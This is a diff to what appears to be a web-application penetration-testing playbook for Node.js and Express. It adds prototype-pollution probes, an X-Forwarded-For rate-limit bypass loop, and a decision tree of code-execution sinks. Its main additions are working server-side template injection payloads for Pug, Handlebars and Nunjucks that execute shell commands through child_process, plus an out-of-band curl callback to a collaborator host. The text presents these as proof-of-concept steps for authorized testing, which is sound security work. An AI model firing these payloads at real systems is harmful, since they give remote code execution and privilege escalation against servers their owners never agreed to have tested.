@@ -69,7 +69,22 @@ curl -s "https://$TARGET/api/data?constructor[prototype][admin]=1"
 
 # Confirm pollution: does a subsequent request reflect the polluted key?
 curl -s "https://$TARGET/api/me" | grep -i "polluted\|isAdmin\|admin"
+
+# BLIND pollution confirmation (no reflection) — pollute a key the framework reads later.
+# status/json-spaces pollution changes response SHAPE without echoing your key:
+curl -s -X POST https://$TARGET/api/any -H "Content-Type: application/json" \
+  -d '{"__proto__":{"json spaces":10}}'            # subsequent JSON responses become indented
+curl -s -X POST https://$TARGET/api/any -H "Content-Type: application/json" \
+  -d '{"__proto__":{"status":510}}'                # Express may return 510 on the NEXT request
+# Body/header-diff a clean baseline vs post-pollution response — a changed shape with no
+# echoed key is a definitive BLIND pollution signal (ships: prototype-pollution-finder / ppmap).
 ```
+
+**Prototype-pollution decision tree (generic, any stack):**
+1. Does the app accept `__proto__` / `constructor.prototype` via JSON body, query string (qs/express), or multipart? Test all three parsers — one is often unprotected.
+2. Confirm pollution: reflected key (easy) OR blind shape-change (`json spaces`, `status`, `content-type` override). Blind counts.
+3. Find the sink the polluted key reaches: template-engine options (EJS `outputFunctionName`, Pug/Handlebars), `child_process` spawn options (`shell`, `env`, `NODE_OPTIONS`), `require`/`import`, or ajv/validation bypass (`__proto__` sets a default that satisfies a schema → mass-assignment).
+4. No RCE sink reachable? A pollution that flips an authz flag or validation default is still High (privilege escalation / mass assignment) — report that impact, don't overclaim RCE.
 
 ---
 
@@ -122,13 +137,16 @@ curl -s -X POST https://$TARGET/api/internal \
   -H "X-Forwarded-For: 10.0.0.1" \
   -H "X-Real-IP: 10.0.0.1"
 
-# Rate limit bypass via rotating fake IPs
-for i in $(seq 1 50); do
-  curl -s https://$TARGET/api/login \
-    -H "X-Forwarded-For: 1.2.3.$i" \
-    -d '{"email":"admin@test.com","password":"wrong"}' \
-    -o /dev/null -w "$i: %{http_code}\n"
+# Rate-limit-reset PROOF (NOT brute force): send a small controlled burst to the SAME
+# synthetic account to the point of 429, then flip X-Forwarded-For and show the counter
+# resets. Stop at proof — a handful of requests, never a password list / keyspace.
+for ip in 1.1.1.1 1.1.1.1 1.1.1.1 2.2.2.2; do
+  curl -s https://$TARGET/api/login -H "X-Forwarded-For: $ip" \
+    -d '{"email":"synthetic-nonexistent-zzz@example.com","password":"wrong-fixed-value"}' \
+    -o /dev/null -w "$ip -> %{http_code}\n"
 done
+# Signal: 200/401 → 200/401 → 429 (limited), then 200/401 again after the IP flip = per-IP
+# counter spoofable via trust-proxy. That is the finding; do not escalate into real cracking.
 ```
 
 ---
@@ -152,10 +170,18 @@ curl -s -X POST https://$TARGET/api/render \
   -H "Content-Type: application/json" \
   -d '{"template": "- var x = root.process\n= x.mainModule.require(\"child_process\").execSync(\"id\")"}'
 
-# Handlebars — prototype pollution via template
+# Handlebars RCE (working gadget — constructor.constructor escape).
+# Detect first: Handlebars reflects {{this}} and errors on {{7*7}} (no inline math).
 curl -s -X POST https://$TARGET/api/render \
   -H "Content-Type: application/json" \
-  -d '{"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require(childprocess).execSync(id)\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"}'
+  -d '{"template":"{{#with \"constructor\" as |a|}}{{#with (a.constructor.constructor \"return process.mainModule.require('"'"'child_process'"'"').execSync('"'"'id'"'"').toString()\") as |f|}}{{f}}{{/with}}{{/with}}"}'
+
+# Nunjucks (common Express templating) RCE:
+curl -s -X POST https://$TARGET/api/render -H "Content-Type: application/json" \
+  -d '{"template":"{{range.constructor(\"return global.process.mainModule.require('"'"'child_process'"'"').execSync('"'"'id'"'"')\")()}}"}'
+
+# Confirm with OOB if output is not reflected: replace id with
+#   curl http://UNIQUE.COLLAB/ssti  (unique subdomain) and poll the listener.
 ```
 
 ---
@@ -207,9 +233,10 @@ curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
 
 ## Validation
 
-✅ Prototype pollution: key appears in subsequent API responses without being sent
-✅ RCE chain: OOB callback received OR `id` output in response
-✅ Trust proxy: spoofed IP accepted, bypasses rate limit or allowlist
+✅ Prototype pollution: polluted key appears in a later response OR causes a provable blind shape-change (`json spaces`/`status`) body-diffed vs a clean baseline
+✅ RCE chain: OOB callback on a unique subdomain received OR `id`/`whoami` output in response (not just "no error")
+✅ Trust proxy: spoofed `X-Forwarded-For` accepted and demonstrably resets a rate counter or passes an IP allowlist — prove the state change, don't infer it
+✅ SSTI: `{{7*7}}`→49 for the right engine, then RCE confirmed by command output or OOB
 
 **Severity:**
 - Prototype pollution → RCE: Critical
